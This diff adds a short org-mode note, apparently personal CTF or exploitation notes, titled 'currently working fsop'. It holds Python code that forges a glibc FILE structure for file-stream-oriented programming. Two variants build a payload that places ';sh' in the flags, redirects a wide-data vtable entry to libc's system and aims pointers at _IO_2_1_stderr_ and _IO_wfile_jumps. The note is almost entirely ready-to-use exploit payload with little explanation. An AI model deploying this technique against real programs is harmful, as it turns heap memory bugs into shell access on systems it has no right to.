@@ -1,0 +1,31 @@
+* currently working fsop
+#+BEGIN_SRC python
+  file = FileStructure(0)
+  file.flags = u64(p32(0xfbad0101) + b";sh\0")
+  file._IO_save_end = libc.sym["system"]
+  file._lock = libc.sym["_IO_2_1_stderr_"] - 0x10
+  file._wide_data = libc.sym["_IO_2_1_stderr_"] - 0x10
+  file._offset = 0
+  file._old_offset = 0
+  file.unknown2 = b"\x00"*24+ p32(1) + p32(0) + p64(0) + \
+      p64(libc.sym["_IO_2_1_stderr_"] - 0x10) + \
+      p64(libc.sym["_IO_wfile_jumps"] + 0x18 - 0x58) + \
+      p64(0xfbad2887)
+  # file.unknown1 = libc.sym["_IO_2_1_stderr_"] - 0x10
+
+  # ptr yudai
+  payload  = p32(0xfbad0101) + b";sh\0" # fp->_flags & _IO_UNBUFFERED == 0)
+  payload += b"\x00" * (0x58 - len(payload))
+  payload += p64(libc.sym["system"]) # vtable->iowalloc
+  payload += b"\x00" * (0x88 - len(payload))
+  payload += p64(libc.sym["_IO_2_1_stderr_"] - 0x10) # _wide_data (1)
+  payload += b"\x00" * (0xa0 - len(payload))
+  payload += p64(libc.sym["_IO_2_1_stderr_"] - 0x10) # _wide_data (1)
+  payload += b"\x00" * (0xc0 - len(payload))
+  payload += p32(1) # fp->_mode != 0
+  payload += b"\x00" * (0xd0 - len(payload))
+  payload += p64(libc.sym["_IO_2_1_stderr_"] - 0x10) # (1) _wide_data->vtable
+  payload += p64(libc.sym["_IO_wfile_jumps"] + 0x18 - 0x58) # _IO_wfile_jumps + delta
+  payload += p64(0xfbad2887)
+#+END_SRC
+
